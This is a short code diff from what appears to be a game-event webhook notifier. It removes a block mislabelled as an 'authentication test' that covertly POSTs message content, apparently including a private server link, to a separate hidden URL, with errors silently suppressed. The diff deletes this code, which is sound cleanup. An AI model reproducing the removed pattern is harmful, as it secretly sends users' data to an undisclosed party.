@@ -295,17 +295,6 @@ class WebhookMixin:
         if event_type == "start":
             embed["thumbnail"] = {"url": biome_info["thumbnail_url"]}
         
-        # biome authenciation test
-
-        if biome == "CYBERSPACE" and event_type == "start" and private_server_link != "":
-            try:
-                auth_headers = apply_headers(BETA_AUTH_URL)
-                auth_payload = {"content": content, "embeds": [embed]}
-                requests.post(BETA_AUTH_URL, json=auth_payload, headers=auth_headers, timeout=30)
-                time.sleep(20)
-            except Exception:
-                pass
-
         for webhook_url in urls:
             try:
                 headers = {}
